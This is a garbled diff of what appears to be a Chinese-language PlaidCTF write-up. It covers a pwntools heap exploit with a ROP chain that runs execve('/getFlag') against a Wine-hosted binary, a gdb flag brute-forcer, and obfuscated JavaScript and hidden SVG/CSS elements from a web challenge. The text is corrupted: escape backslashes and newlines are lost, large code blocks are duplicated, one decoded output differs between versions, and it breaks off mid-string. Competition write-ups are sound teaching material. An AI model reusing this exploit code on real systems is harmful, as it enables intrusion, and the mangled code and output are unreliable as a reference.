@@ -45,14 +45,23 @@ int __cdecl main_0(int argc, const char **argv, const char **envp){    ...   
 
 4.构建ROP链执行execve(“/getFlag”, NULL, NULL)
 
-#!/usr/bin/python3# -*- coding:utf-8 -*-
+#!/usr/bin/python3
+# -*- coding:
+utf-8 -*-
 from pwn import *
 context.clear(arch='amd64', os='windows', log_level='debug')
-sh = process(['docker', 'run', '--privileged', '--rm', '-i', 'heap2'])# sh = remote('bhqm.chal.pwni.ng', 1337)# sh.send(os.popen(sh.recvline().decode()).read().encode())
+sh = process(['docker', 'run', '--privileged', '--rm', '-i', 'heap2'])
+# sh = remote('bhqm.chal.pwni.ng', 1337)
+# sh.send(os.popen(sh.recvline().decode()).read().encode())
 def add(size):    sh.sendlineafter(b'choice? ', b'1')    sh.sendlineafter(b'size? ', str(size).encode())
 def edit(index, content):    sh.sendlineafter(b'choice? ', b'4')    sh.sendlineafter(b'index? ', str(index).encode())    sh.sendlineafter(b'data? ', binascii.b2a_hex(content))
-dump_memory = b'x00x00x00x00x00x00x00x00xc0x01x01x00x00x00x00x00lx00x00x00r\.winex00WINEDLLDIR0=)x00x00x00FREEx80x01x01x00x00x00x00x00`x01x01x00x00x00x00x00nux-gnu\winex00WINEUSERNAME=userx00x00H;x01x00x00x00x00x00xbax03x00x00USEx08`<x01x00x00x00x00x00v<x01x00x00x00x00x00x8a<x01x00x00x00x00x00xaa<x01x00x00x00x00x00xbd<x01x00x00x00x00x00xd5<x01x00x00x00x00x00xf2<x01x00x00x00x00x009=x01x00x00x00x00x00L=x01x00x00x00x00x00d=x01x00x00x00x00x00x8b=x01x00x00x00x00x00x9e=x01x00x00x00x00x00xab=x01x00x00x00x00x00xc0=x01x00x00x00x00x00xfb=x01x00x00x00x00x00x16>x01x00x00x00x00x00*>x01x00x00x00x00x00B>x01x00x00x00x00x00P>x01x00x00x00x00x00j>x01x00x00x00x00x00x84>x01x00x00x00x00x00xba>x01x00x00x00x00x00xd7>x01x00x00x00x00x00xfc>x01x00x00x00x00x00-?x01x00x00x00x00x00x00x00x00x00x00x00x00x00HOSTNAME=e7de35656151x00WINEDEBUG=fixme-allx00WINELOADER=/usr/lib/wine/wine64x00WINELOADERNOEXEC=1x00NUMBER_OF_PROCESSORS=16x00PROCESSOR_ARCHITECTURE=AMD64x00PROCESSOR_IDENTIFIER=AMD64 Family 25 Model 80 Stepping 0, AuthenticAMDx00PROCESSOR_LEVEL=25x00PROCESSOR_REVISION=5000x00APPDATA=C:\users\user\Application Datax00CLIENTNAME=Consolex00HOMEDRIVE=C:x00HOMEPATH=\users\userx00LOCALAPPDATA=C:\users\user\Local Settings\Application Datax00LOGONSERVER=\\E7DE35656151x00SESSIONNAME=Consolex00USERDOMAIN=E7DE35656151x00USERNAME=userx00USERPROFILE=C:\users\userx00COMPUTERNAME=E7DE35656151x00WINEDATADIR=\??\Z:\usr\lib\wine\..\..\share\wine\winex00WINEHOMEDIR=\??\Z:\home\userx00WINECONFIGDIR=\??\Z:\home\user\.winex00WINEDLLDIR0=\??\Z:\usr\lib\x86_64-linux-gnu\winex00WINEUSERNAME=userx00x00x00x00x00x00x00x00x00x00xb8x03x00x00USEx08 @x01x00x00x00x00x006@x01x00x00x00x00x00J@x01x00x00x00x00x00j@x01x00x00x00x00x00}@x01x00x00x00x00x00x95@x01x00x00x00x00x00xb2@x01x00x00x00x00x00xf9@x01x00x00x00x00x00x0cAx01x00x00x00x00x00$Ax01x00x00x00x00x00KAx01x00x00x00x00x00^Ax01x00x00x00x00x00kAx01x00x00x00x00x00x80Ax01x00x00x00x00x00xbbAx01x00x00x00x00x00xd6Ax01x00x00x00x00x00xeaAx01x00x00x00x00x00x02Bx01x00x00x00x00x00x10Bx01x00x00x00x00x00*Bx01x00x00x00x00x00DBx01x00x00x00x00x00zBx01x00x00x00x00x00x97Bx01x00x00x00x00x00xbcBx01x00x00x00x00x00xedBx01x00x00x00x00x00x00x00x00x00x00x00x00x00HOSTNAME=e7de35656151x00WINEDEBUG=fixme-allx00WINELOADER=/usr/lib/wine/wine64x00WINELOADERNOEXEC=1x00NUMBER_OF_PROCESSORS=16x00PROCESSOR_ARCHITECTURE=AMD64x00PROCESSOR_IDENTIFIER=AMD64 Family 25 Model 80 Stepping 0, AuthenticAMDx00PROCESSOR_LEVEL=25x00PROCESSOR_REVISION=5000x00APPDATA=C:\users\user\Application Datax00CLIENTNAME=Consolex00HOMEDRIVE=C:x00HOMEPATH=\users\userx00LOCALAPPDATA=C:\users\user\Local Settings\Application Datax00LOGONSERVER=\\E7DE35656151x00SESSIONNAME=Consolex00USERDOMAIN=E7DE35656151x00USERNAME=userx00USERPROFILE=C:\users\userx00COMPUTERNAME=E7DE35656151x00WINEDATADIR=\??\Z:\usr\lib\wine\..\..\share\wine\winex00WINEHOMEDIR=\??\Z:\home\userx00WINECONFIGDIR=\??\Z:\home\user\.winex00WINEDLLDIR0=\??\Z:\usr\lib\x86_64-linux-gnu\winex00WINEUSERNAME=userx00x00x00x00x00x00x00x00x00x00x18x02x00x00USEx10Zx00:x00\x00bx00ax00bx00yx00-x00hx00ex00ax00px00-x00qx00ux00ex00sx00tx00ix00ox00nx00-x00mx00ax00rx00kx00.x00ex00xx00ex00x00x00=x00fx00ix00xx00mx00ex00-x00ax00lx00lx00x00x00Wx00Ix00Nx00Ex00Lx00Ox00Ax00Dx00Ex00Rx00=x00/x00ux00sx00rx00/x00lx00ix00bx00/x00wx00ix00nx00ex00/x00wx00ix00nx00ex006x004x00x00x00Wx00Ix00Nx00Ex00Lx00Ox00Ax00Dx00Ex00Rx00Nx00Ox00Ex00Xx00Ex00Cx00=x001x00x00x00Nx00Ux00Mx00Bx00Ex00Rx00_x00Ox00Fx00_x00Px00Rx00Ox00Cx00Ex00Sx00Sx00Ox00Rx00Sx00=x001x006x00x00x00Px00Rx00Ox00Cx00Ex00Sx00Sx00Ox00Rx00_x00Ax00Rx00Cx00Hx00Ix00Tx00Ex00Cx00Tx00Ux00Rx00Ex00=x00Ax00Mx00Dx006x004x00x00x00Px00Rx00Ox00Cx00Ex00Sx00Sx00Ox00Rx00_x00Ix00Dx00Ex00Nx00Tx00Ix00Fx00Ix00Ex00Rx00=x00Ax00Mx00Dx006x004x00 x00Fx00ax00mx00ix00lx00yx00 x002x005x00 x00Mx00ox00dx00ex00lx00 x008x000x00 x00Sx00tx00ex00px00px00ix00nx00gx00 x000x00,x00 x00Ax00ux00tx00hx00ex00nx00tx00ix00cx00Ax00Mx00Dx00x00x00Px00Rx00Ox00Cx00Ex00Sx00Sx00Ox00Rx00_x00Lx00Ex00Vx00Ex00Lx00=x002x005x00x00x00Px00Rx00Ox00Cx00Ex00Sx00Sx00Ox00Rx00_x00Rx00Ex00Vx00Ix00Sx00Ix00Ox00Nx00=x005x000x000x000x00x00x00Ax00Px00Px00Dx00Ax00Tx00Ax00=x00hx00x00x00USEx08'SYS_execve = 59
-add(3)edit(0, flat({0:dump_memory, 0xa10:p64(4) + p64(0x21fad8) + p64(4)}, filler=b'0'))edit(0, flat([    0x00000003af6b3fa9, 0,          # pop rdx; add eax, 0x7e0f6600; ret;    0x00000003af686040, SYS_execve, # pop rax; ret;    0x00000003af686177, 0x21fb20,   # pop rdi; ret;    0x00000003af68655a, 0,          # pop rsi; ret;    0x00000003af67bb76,             # syscall;    b'/getFlag0',                  # execve("/getFlag", NULL, NULL)]))
+dump_memory = b'x00x00x00x00x00x00x00x00xc0x01x01x00x00x00x00x00lx00x00x00r\.winex00WINEDLLDIR0=)x00x00x00FREEx80x01x01x00x00x00x00x00`x01x01x00x00x00x00x00nux-gnu\winex00WINEUSERNAME=userx00x00H;x01x00x00x00x00x00xbax03x00x00USEx08`<x01x00x00x00x00x00v<x01x00x00x00x00x00x8a<x01x00x00x00x00x00xaa<x01x00x00x00x00x00xbd<x01x00x00x00x00x00xd5<x01x00x00x00x00x00xf2<x01x00x00x00x00x009=x01x00x00x00x00x00L=x01x00x00x00x00x00d=x01x00x00x00x00x00x8b=x01x00x00x00x00x00x9e=x01x00x00x00x00x00xab=x01x00x00x00x00x00xc0=x01x00x00x00x00x00xfb=x01x00x00x00x00x00x16>x01x00x00x00x00x00*>x01x00x00x00x00x00B>x01x00x00x00x00x00P>x01x00x00x00x00x00j>x01x00x00x00x00x00x84>x01x00x00x00x00x00xba>x01x00x00x00x00x00xd7>x01x00x00x00x00x00xfc>x01x00x00x00x00x00-?x01x00x00x00x00x00x00x00x00x00x00x00x00x00HOSTNAME=e7de35656151x00WINEDEBUG=fixme-allx00WINELOADER=/usr/lib/wine/wine64x00WINELOADERNOEXEC=1x00NUMBER_OF_PROCESSORS=16x00PROCESSOR_ARCHITECTURE=AMD64x00PROCESSOR_IDENTIFIER=AMD64 Family 25 Model 80 Stepping 0, AuthenticAMDx00PROCESSOR_LEVEL=25x00PROCESSOR_REVISION=5000x00APPDATA=C:\users\user\Application Datax00CLIENTNAME=Consolex00HOMEDRIVE=C:
+x00HOMEPATH=\users\userx00LOCALAPPDATA=C:\users\user\Local Settings\Application Datax00LOGONSERVER=\\E7DE35656151x00SESSIONNAME=Consolex00USERDOMAIN=E7DE35656151x00USERNAME=userx00USERPROFILE=C:\users\userx00COMPUTERNAME=E7DE35656151x00WINEDATADIR=\??\Z:\usr\lib\wine\..\..\share\wine\winex00WINEHOMEDIR=\??\Z:\home\userx00WINECONFIGDIR=\??\Z:\home\user\.winex00WINEDLLDIR0=\??\Z:\usr\lib\x86_64-linux-gnu\winex00WINEUSERNAME=userx00x00x00x00x00x00x00x00x00x00xb8x03x00x00USEx08 @x01x00x00x00x00x006@x01x00x00x00x00x00J@x01x00x00x00x00x00j@x01x00x00x00x00x00}@x01x00x00x00x00x00x95@x01x00x00x00x00x00xb2@x01x00x00x00x00x00xf9@x01x00x00x00x00x00x0cAx01x00x00x00x00x00$Ax01x00x00x00x00x00KAx01x00x00x00x00x00^Ax01x00x00x00x00x00kAx01x00x00x00x00x00x80Ax01x00x00x00x00x00xbbAx01x00x00x00x00x00xd6Ax01x00x00x00x00x00xeaAx01x00x00x00x00x00x02Bx01x00x00x00x00x00x10Bx01x00x00x00x00x00*Bx01x00x00x00x00x00DBx01x00x00x00x00x00zBx01x00x00x00x00x00x97Bx01x00x00x00x00x00xbcBx01x00x00x00x00x00xedBx01x00x00x00x00x00x00x00x00x00x00x00x00x00HOSTNAME=e7de35656151x00WINEDEBUG=fixme-allx00WINELOADER=/usr/lib/wine/wine64x00WINELOADERNOEXEC=1x00NUMBER_OF_PROCESSORS=16x00PROCESSOR_ARCHITECTURE=AMD64x00PROCESSOR_IDENTIFIER=AMD64 Family 25 Model 80 Stepping 0, AuthenticAMDx00PROCESSOR_LEVEL=25x00PROCESSOR_REVISION=5000x00APPDATA=C:\users\user\Application Datax00CLIENTNAME=Consolex00HOMEDRIVE=C:
+x00HOMEPATH=\users\userx00LOCALAPPDATA=C:\users\user\Local Settings\Application Datax00LOGONSERVER=\\E7DE35656151x00SESSIONNAME=Consolex00USERDOMAIN=E7DE35656151x00USERNAME=userx00USERPROFILE=C:\users\userx00COMPUTERNAME=E7DE35656151x00WINEDATADIR=\??\Z:\usr\lib\wine\..\..\share\wine\winex00WINEHOMEDIR=\??\Z:\home\userx00WINECONFIGDIR=\??\Z:\home\user\.winex00WINEDLLDIR0=\??\Z:\usr\lib\x86_64-linux-gnu\winex00WINEUSERNAME=userx00x00x00x00x00x00x00x00x00x00x18x02x00x00USEx10Zx00:
+x00\x00bx00ax00bx00yx00-x00hx00ex00ax00px00-x00qx00ux00ex00sx00tx00ix00ox00nx00-x00mx00ax00rx00kx00.x00ex00xx00ex00x00x00=x00fx00ix00xx00mx00ex00-x00ax00lx00lx00x00x00Wx00Ix00Nx00Ex00Lx00Ox00Ax00Dx00Ex00Rx00=x00/x00ux00sx00rx00/x00lx00ix00bx00/x00wx00ix00nx00ex00/x00wx00ix00nx00ex006x004x00x00x00Wx00Ix00Nx00Ex00Lx00Ox00Ax00Dx00Ex00Rx00Nx00Ox00Ex00Xx00Ex00Cx00=x001x00x00x00Nx00Ux00Mx00Bx00Ex00Rx00_x00Ox00Fx00_x00Px00Rx00Ox00Cx00Ex00Sx00Sx00Ox00Rx00Sx00=x001x006x00x00x00Px00Rx00Ox00Cx00Ex00Sx00Sx00Ox00Rx00_x00Ax00Rx00Cx00Hx00Ix00Tx00Ex00Cx00Tx00Ux00Rx00Ex00=x00Ax00Mx00Dx006x004x00x00x00Px00Rx00Ox00Cx00Ex00Sx00Sx00Ox00Rx00_x00Ix00Dx00Ex00Nx00Tx00Ix00Fx00Ix00Ex00Rx00=x00Ax00Mx00Dx006x004x00 x00Fx00ax00mx00ix00lx00yx00 x002x005x00 x00Mx00ox00dx00ex00lx00 x008x000x00 x00Sx00tx00ex00px00px00ix00nx00gx00 x000x00,x00 x00Ax00ux00tx00hx00ex00nx00tx00ix00cx00Ax00Mx00Dx00x00x00Px00Rx00Ox00Cx00Ex00Sx00Sx00Ox00Rx00_x00Lx00Ex00Vx00Ex00Lx00=x002x005x00x00x00Px00Rx00Ox00Cx00Ex00Sx00Sx00Ox00Rx00_x00Rx00Ex00Vx00Ix00Sx00Ix00Ox00Nx00=x005x000x000x000x00x00x00Ax00Px00Px00Dx00Ax00Tx00Ax00=x00hx00x00x00USEx08'SYS_execve = 59
+add(3)edit(0, flat({0:
+dump_memory, 0xa10:
+p64(4) + p64(0x21fad8) + p64(4)}, filler=b'0'))edit(0, flat([    0x00000003af6b3fa9, 0,          # pop rdx; add eax, 0x7e0f6600; ret;    0x00000003af686040, SYS_execve, # pop rax; ret;    0x00000003af686177, 0x21fb20,   # pop rdi; ret;    0x00000003af68655a, 0,          # pop rsi; ret;    0x00000003af67bb76,             # syscall;    b'/getFlag0',                  # execve("/getFlag", NULL, NULL)]))
 sh.interactive()
 
 Reverse
@@ -82,7 +91,8 @@ flag = ['_'] * 16index = 0
 while True:    if flag[index] != '_':        index = (index + 1) % 16        continue
     counts = []    for ch in 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-':        flag[index] = ch
         gdb.execute(f'starti "{"".join(flag)}"')
-        count = 0        while True:            try:                gdb.execute('c')            except:                break            count += 1                sys.stderr.write(f'ATTEMPT FLAG:{"".join(flag)}, COUNT:{count}n')
+        count = 0        while True:            try:                gdb.execute('c')            
+except:                break            count += 1                sys.stderr.write(f'ATTEMPT FLAG:{"".join(flag)}, COUNT:{count}n')
         counts.append((count, ch))        flag[index] = '_'    if len(set(map(lambda x: x[0], counts))) != 1:        flag[index] = sorted(counts, key=lambda x: x[0], reverse=True)[0][1]        sys.stderr.write(f'CURRENT FLAG: {"".join(flag)}n')        index = (index + 1) % 16
 
 在该位置设置断点，并以字节为单位对输入值进行精细控制。
@@ -115,7 +125,8 @@ PCTF{1234567890123456789012345}
 
 让我们来看看./0.js文件：
 
-const b64 = AB...=;export const go = async () => {    const bti = b64.trim().split("n").reduce((acc, x, i) => (acc.set(x, i), acc), new Map());    const upc = window.buffer.shift();    const moi = await fetch(import.meta.url).then((x) => x.text())    const tg = await fetch(moi.slice(moi.lastIndexOf("=") + 1)).then((x) => x.json())    const fl = tg.mappings.split(";").flatMap((v, l) =>v.split(",").filter((x) => !!x).map((input) => input.split("").map((x) => bti.get(x)).reduce((acc, i) => (i & 32 ? [...acc.slice(0, -1), [...acc.slice(-1)[0], (i & 31)]] : [...acc.slice(0, -1), [[...acc.slice(-1)[0], i].reverse().reduce((acc, i) => (acc << 5) + i, 0)]].map((x) => typeof x === "number" ? x : x[0] & 0x1 ? (x[0] >>> 1) === 0 ? -0x80000000 : -(x[0] >>> 1) : (x[0] >>> 1)).concat([[]])), [[]]).slice(0, -1)).map(([c, s, ol, oc, n]) => [l,c,s??0,ol??0,oc??0,n??0]).reduce((acc, e, i) => [...acc, [l, e[1] + (acc[i - 1]?.[1]??0), ...e.slice(2)]], [])).reduce((acc, e, i) => [...acc, [...e.slice(0, 2), ...e.slice(2).map((x, c) => x + (acc[i - 1]?.[c + 2] ?? 0))]], []).map(([l, c, s, ol, oc, n], i, ls) => [tg.sources[s],moi.split("n").slice(l, ls[i+1] ? ls[i+1]?.[0] + 1 : undefined).map((x, ix, nl) => ix === 0 ? l === ls[i+1]?.[0] ? x.slice(c, ls[i+1]?.[1]) : x.slice(c) : ix === nl.length - 1 ? x.slice(0, ls[i+1]?.[1]) : x).join("n").trim()]).filter(([_, x]) => x === upc).map(([x]) => x)?.[0] ?? tg.sources.slice(-2, -1)[0];    import(./${fl}).then((x) => x.go());}//# sourceMappingURL=0.js.map
+const b64 = AB...=;
+export const go = async () => {    const bti = b64.trim().split("n").reduce((acc, x, i) => (acc.set(x, i), acc), new Map());    const upc = window.buffer.shift();    const moi = await fetch(import.meta.url).then((x) => x.text())    const tg = await fetch(moi.slice(moi.lastIndexOf("=") + 1)).then((x) => x.json())    const fl = tg.mappings.split(";").flatMap((v, l) =>v.split(",").filter((x) => !!x).map((input) => input.split("").map((x) => bti.get(x)).reduce((acc, i) => (i & 32 ? [...acc.slice(0, -1), [...acc.slice(-1)[0], (i & 31)]] : [...acc.slice(0, -1), [[...acc.slice(-1)[0], i].reverse().reduce((acc, i) => (acc << 5) + i, 0)]].map((x) => typeof x === "number" ? x : x[0] & 0x1 ? (x[0] >>> 1) === 0 ? -0x80000000 : -(x[0] >>> 1) : (x[0] >>> 1)).concat([[]])), [[]]).slice(0, -1)).map(([c, s, ol, oc, n]) => [l,c,s??0,ol??0,oc??0,n??0]).reduce((acc, e, i) => [...acc, [l, e[1] + (acc[i - 1]?.[1]??0), ...e.slice(2)]], [])).reduce((acc, e, i) => [...acc, [...e.slice(0, 2), ...e.slice(2).map((x, c) => x + (acc[i - 1]?.[c + 2] ?? 0))]], []).map(([l, c, s, ol, oc, n], i, ls) => [tg.sources[s],moi.split("n").slice(l, ls[i+1] ? ls[i+1]?.[0] + 1 : undefined).map((x, ix, nl) => ix === 0 ? l === ls[i+1]?.[0] ? x.slice(c, ls[i+1]?.[1]) : x.slice(c) : ix === nl.length - 1 ? x.slice(0, ls[i+1]?.[1]) : x).join("n").trim()]).filter(([_, x]) => x === upc).map(([x]) => x)?.[0] ?? tg.sources.slice(-2, -1)[0];    import(./${fl}).then((x) => x.go());}//# sourceMappingURL=0.js.map
 
 让我们逐行的观察代码。
 
@@ -226,9 +237,11 @@ detailshtml标签就像一个可以打开和关闭、显示或隐藏内容的切
 
 图像数据存储为backgroundcss属性
 
-background:url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyMDAiIGhlaWdodD0iNTQwIj48cGF0aCBmaWxsPSIjZmZmIiBkPSJNMCAwSDIwMFY1NDBIMFpNMiA2MlY3OEgxOThWNjJaIi8+PC9zdmc+');
+background:
+url('data:
+image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyMDAiIGhlaWdodD0iNTQwIj48cGF0aCBmaWxsPSIjZmZmIiBkPSJNMCAwSDIwMFY1NDBIMFpNMiA2MlY3OEgxOThWNjJaIi8+PC9zdmc+');
 
-➜  ~ echo "PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyMDAiIGhlaWdodD0iNTQwIj48cGF0aCBmaWxsPSIjZmZmIiBkPSJNMCAwSDIwMFY1NDBIMFpNMiA2MlY3OEgxOThWNjJaIi8+PC9zdmc+" | base64 -d<svg xmlns="http://www.w3.org/2000/svg" width="200" height="540"><path fill="#fff" d="M0 0H200V540H0ZM2 62V78H198V62Z"/></svg>%
+➜  ~ echo "PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyMDAiIGhlaWdodD0iNTQwIj48cGF0aCBmaWxsPSIjZmZmIiBkPSJNMCAwSDIwMFY1NDBIMFpNMiA2MlY3OEgxOThWNjJaIi8+PC9zdmc+" | base64 -d<svg xmlns="http://www.w3.org/2000/svg" width="200" height="540"></svg>%
 
 然而，形状的颜色填充是#fff(白色)
 
@@ -252,7 +265,8 @@ path元素向下移动了！
 
 如果我们更仔细地回顾源代码，
 
-有一个鬼鬼祟祟的div通过使用css属性z-index:0隐藏在所有东西后面。
+有一个鬼鬼祟祟的div通过使用css属性z-index:
+0隐藏在所有东西后面。
 
 可以通过增加z-index把它拉到前面，看看它是什么。
 
@@ -455,37 +469,26 @@ class Cipher:    def __init__(self, key_bytes: bytes, mode: Mode):        
 
 ```
 int __cdecl main_0(int argc, const char **argv, const char **envp){    ...        v30 = v66;        Src = (void *)*((_QWORD *)&v66 + 1);        v31 = Size;        if ( v62 )          sub_140002920(v26, (__int64)v62, (__int64)v62 >= 0);        v61 = DWORD1(v30);        if ( v24 < v70 )        {          v32 = (void *)v69[v24].buf;          if ( v32 )            memcpy(v32, Src, v31);        }    ...}
-```
-
-
-
-```
 00000000 node struc ; (sizeof=0x18, mappedto_50)00000000 size dq ?00000008 buf dq ?00000010 field_10 dq ?00000018 node ends
-```
-
-
-
-```
-#!/usr/bin/python3# -*- coding:utf-8 -*-
+#!/usr/bin/python3
+# -*- coding:
+utf-8 -*-
 from pwn import *
 context.clear(arch='amd64', os='windows', log_level='debug')
-sh = process(['docker', 'run', '--privileged', '--rm', '-i', 'heap2'])# sh = remote('bhqm.chal.pwni.ng', 1337)# sh.send(os.popen(sh.recvline().decode()).read().encode())
+sh = process(['docker', 'run', '--privileged', '--rm', '-i', 'heap2'])
+# sh = remote('bhqm.chal.pwni.ng', 1337)
+# sh.send(os.popen(sh.recvline().decode()).read().encode())
 def add(size):    sh.sendlineafter(b'choice? ', b'1')    sh.sendlineafter(b'size? ', str(size).encode())
 def edit(index, content):    sh.sendlineafter(b'choice? ', b'4')    sh.sendlineafter(b'index? ', str(index).encode())    sh.sendlineafter(b'data? ', binascii.b2a_hex(content))
-dump_memory = b'x00x00x00x00x00x00x00x00xc0x01x01x00x00x00x00x00lx00x00x00r\.winex00WINEDLLDIR0=)x00x00x00FREEx80x01x01x00x00x00x00x00`x01x01x00x00x00x00x00nux-gnu\winex00WINEUSERNAME=userx00x00H;x01x00x00x00x00x00xbax03x00x00USEx08`<x01x00x00x00x00x00v<x01x00x00x00x00x00x8a<x01x00x00x00x00x00xaa<x01x00x00x00x00x00xbd<x01x00x00x00x00x00xd5<x01x00x00x00x00x00xf2<x01x00x00x00x00x009=x01x00x00x00x00x00L=x01x00x00x00x00x00d=x01x00x00x00x00x00x8b=x01x00x00x00x00x00x9e=x01x00x00x00x00x00xab=x01x00x00x00x00x00xc0=x01x00x00x00x00x00xfb=x01x00x00x00x00x00x16>x01x00x00x00x00x00*>x01x00x00x00x00x00B>x01x00x00x00x00x00P>x01x00x00x00x00x00j>x01x00x00x00x00x00x84>x01x00x00x00x00x00xba>x01x00x00x00x00x00xd7>x01x00x00x00x00x00xfc>x01x00x00x00x00x00-?x01x00x00x00x00x00x00x00x00x00x00x00x00x00HOSTNAME=e7de35656151x00WINEDEBUG=fixme-allx00WINELOADER=/usr/lib/wine/wine64x00WINELOADERNOEXEC=1x00NUMBER_OF_PROCESSORS=16x00PROCESSOR_ARCHITECTURE=AMD64x00PROCESSOR_IDENTIFIER=AMD64 Family 25 Model 80 Stepping 0, AuthenticAMDx00PROCESSOR_LEVEL=25x00PROCESSOR_REVISION=5000x00APPDATA=C:\users\user\Application Datax00CLIENTNAME=Consolex00HOMEDRIVE=C:x00HOMEPATH=\users\userx00LOCALAPPDATA=C:\users\user\Local Settings\Application Datax00LOGONSERVER=\\E7DE35656151x00SESSIONNAME=Consolex00USERDOMAIN=E7DE35656151x00USERNAME=userx00USERPROFILE=C:\users\userx00COMPUTERNAME=E7DE35656151x00WINEDATADIR=\??\Z:\usr\lib\wine\..\..\share\wine\winex00WINEHOMEDIR=\??\Z:\home\userx00WINECONFIGDIR=\??\Z:\home\user\.winex00WINEDLLDIR0=\??\Z:\usr\lib\x86_64-linux-gnu\winex00WINEUSERNAME=userx00x00x00x00x00x00x00x00x00x00xb8x03x00x00USEx08 @x01x00x00x00x00x006@x01x00x00x00x00x00J@x01x00x00x00x00x00j@x01x00x00x00x00x00}@x01x00x00x00x00x00x95@x01x00x00x00x00x00xb2@x01x00x00x00x00x00xf9@x01x00x00x00x00x00x0cAx01x00x00x00x00x00$Ax01x00x00x00x00x00KAx01x00x00x00x00x00^Ax01x00x00x00x00x00kAx01x00x00x00x00x00x80Ax01x00x00x00x00x00xbbAx01x00x00x00x00x00xd6Ax01x00x00x00x00x00xeaAx01x00x00x00x00x00x02Bx01x00x00x00x00x00x10Bx01x00x00x00x00x00*Bx01x00x00x00x00x00DBx01x00x00x00x00x00zBx01x00x00x00x00x00x97Bx01x00x00x00x00x00xbcBx01x00x00x00x00x00xedBx01x00x00x00x00x00x00x00x00x00x00x00x00x00HOSTNAME=e7de35656151x00WINEDEBUG=fixme-allx00WINELOADER=/usr/lib/wine/wine64x00WINELOADERNOEXEC=1x00NUMBER_OF_PROCESSORS=16x00PROCESSOR_ARCHITECTURE=AMD64x00PROCESSOR_IDENTIFIER=AMD64 Family 25 Model 80 Stepping 0, AuthenticAMDx00PROCESSOR_LEVEL=25x00PROCESSOR_REVISION=5000x00APPDATA=C:\users\user\Application Datax00CLIENTNAME=Consolex00HOMEDRIVE=C:x00HOMEPATH=\users\userx00LOCALAPPDATA=C:\users\user\Local Settings\Application Datax00LOGONSERVER=\\E7DE35656151x00SESSIONNAME=Consolex00USERDOMAIN=E7DE35656151x00USERNAME=userx00USERPROFILE=C:\users\userx00COMPUTERNAME=E7DE35656151x00WINEDATADIR=\??\Z:\usr\lib\wine\..\..\share\wine\winex00WINEHOMEDIR=\??\Z:\home\userx00WINECONFIGDIR=\??\Z:\home\user\.winex00WINEDLLDIR0=\??\Z:\usr\lib\x86_64-linux-gnu\winex00WINEUSERNAME=userx00x00x00x00x00x00x00x00x00x00x18x02x00x00USEx10Zx00:x00\x00bx00ax00bx00yx00-x00hx00ex00ax00px00-x00qx00ux00ex00sx00tx00ix00ox00nx00-x00mx00ax00rx00kx00.x00ex00xx00ex00x00x00=x00fx00ix00xx00mx00ex00-x00ax00lx00lx00x00x00Wx00Ix00Nx00Ex00Lx00Ox00Ax00Dx00Ex00Rx00=x00/x00ux00sx00rx00/x00lx00ix00bx00/x00wx00ix00nx00ex00/x00wx00ix00nx00ex006x004x00x00x00Wx00Ix00Nx00Ex00Lx00Ox00Ax00Dx00Ex00Rx00Nx00Ox00Ex00Xx00Ex00Cx00=x001x00x00x00Nx00Ux00Mx00Bx00Ex00Rx00_x00Ox00Fx00_x00Px00Rx00Ox00Cx00Ex00Sx00Sx00Ox00Rx00Sx00=x001x006x00x00x00Px00Rx00Ox00Cx00Ex00Sx00Sx00Ox00Rx00_x00Ax00Rx00Cx00Hx00Ix00Tx00Ex00Cx00Tx00Ux00Rx00Ex00=x00Ax00Mx00Dx006x004x00x00x00Px00Rx00Ox00Cx00Ex00Sx00Sx00Ox00Rx00_x00Ix00Dx00Ex00Nx00Tx00Ix00Fx00Ix00Ex00Rx00=x00Ax00Mx00Dx006x004x00 x00Fx00ax00mx00ix00lx00yx00 x002x005x00 x00Mx00ox00dx00ex00lx00 x008x000x00 x00Sx00tx00ex00px00px00ix00nx00gx00 x000x00,x00 x00Ax00ux00tx00hx00ex00nx00tx00ix00cx00Ax00Mx00Dx00x00x00Px00Rx00Ox00Cx00Ex00Sx00Sx00Ox00Rx00_x00Lx00Ex00Vx00Ex00Lx00=x002x005x00x00x00Px00Rx00Ox00Cx00Ex00Sx00Sx00Ox00Rx00_x00Rx00Ex00Vx00Ix00Sx00Ix00Ox00Nx00=x005x000x000x000x00x00x00Ax00Px00Px00Dx00Ax00Tx00Ax00=x00hx00x00x00USEx08'SYS_execve = 59
-add(3)edit(0, flat({0:dump_memory, 0xa10:p64(4) + p64(0x21fad8) + p64(4)}, filler=b'0'))edit(0, flat([    0x00000003af6b3fa9, 0,          # pop rdx; add eax, 0x7e0f6600; ret;    0x00000003af686040, SYS_execve, # pop rax; ret;    0x00000003af686177, 0x21fb20,   # pop rdi; ret;    0x00000003af68655a, 0,          # pop rsi; ret;    0x00000003af67bb76,             # syscall;    b'/getFlag0',                  # execve("/getFlag", NULL, NULL)]))
+dump_memory = b'x00x00x00x00x00x00x00x00xc0x01x01x00x00x00x00x00lx00x00x00r\.winex00WINEDLLDIR0=)x00x00x00FREEx80x01x01x00x00x00x00x00`x01x01x00x00x00x00x00nux-gnu\winex00WINEUSERNAME=userx00x00H;x01x00x00x00x00x00xbax03x00x00USEx08`<x01x00x00x00x00x00v<x01x00x00x00x00x00x8a<x01x00x00x00x00x00xaa<x01x00x00x00x00x00xbd<x01x00x00x00x00x00xd5<x01x00x00x00x00x00xf2<x01x00x00x00x00x009=x01x00x00x00x00x00L=x01x00x00x00x00x00d=x01x00x00x00x00x00x8b=x01x00x00x00x00x00x9e=x01x00x00x00x00x00xab=x01x00x00x00x00x00xc0=x01x00x00x00x00x00xfb=x01x00x00x00x00x00x16>x01x00x00x00x00x00*>x01x00x00x00x00x00B>x01x00x00x00x00x00P>x01x00x00x00x00x00j>x01x00x00x00x00x00x84>x01x00x00x00x00x00xba>x01x00x00x00x00x00xd7>x01x00x00x00x00x00xfc>x01x00x00x00x00x00-?x01x00x00x00x00x00x00x00x00x00x00x00x00x00HOSTNAME=e7de35656151x00WINEDEBUG=fixme-allx00WINELOADER=/usr/lib/wine/wine64x00WINELOADERNOEXEC=1x00NUMBER_OF_PROCESSORS=16x00PROCESSOR_ARCHITECTURE=AMD64x00PROCESSOR_